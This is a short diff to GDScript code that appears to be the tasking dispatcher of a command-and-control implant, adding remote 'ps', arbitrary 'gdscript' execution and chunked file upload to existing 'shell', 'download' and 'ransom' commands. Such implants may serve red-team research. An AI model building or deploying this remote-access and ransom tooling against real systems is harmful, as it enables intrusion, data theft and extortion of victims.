@@ -8,7 +8,12 @@ signal whoami
 signal exit
 signal ransom
 signal post_response
+signal ps
 signal shell
+signal gdscript
+signal upload
+signal upload_start
+signal upload_chunk
 signal download
 signal download_start
 signal download_chunk
@@ -44,8 +49,15 @@ func _on_Agent_tasking(data):
 				"download":
 					task_id_to_last_action[task.get("id")] = "download"
 					emit_signal("download", task)
+				"upload":
+					task_id_to_last_action[task.get("id")] = "upload"
+					emit_signal("upload", task)
 				"shell":
 					emit_signal("shell", task)
+				"gdscript":
+					emit_signal("gdscript", task)
+				"ps":
+					emit_signal("ps", task)
 				"whoami":
 					emit_signal("whoami", task)
 				"exit":
@@ -68,6 +80,18 @@ func _on_Agent_post_response(data):
 		if response.get("status") == "success":
 
 			match task_id_to_last_action.get(task_id):
+				"upload":
+					if response.has("file_id"):
+						emit_signal("upload_start", response)
+						task_id_to_last_action[task_id ] = "upload_chunk"
+					else:
+						print("Bad upload response: ", response)
+				"upload_chunk":
+					if response.has("file_id"):
+						emit_signal("upload_chunk", response)
+						task_id_to_last_action[task_id ] = "upload_chunk"
+					else:
+						print("Bad upload response: ", response)
 				"download":
 					if response.has("file_id"):
 						emit_signal("download_start", response)
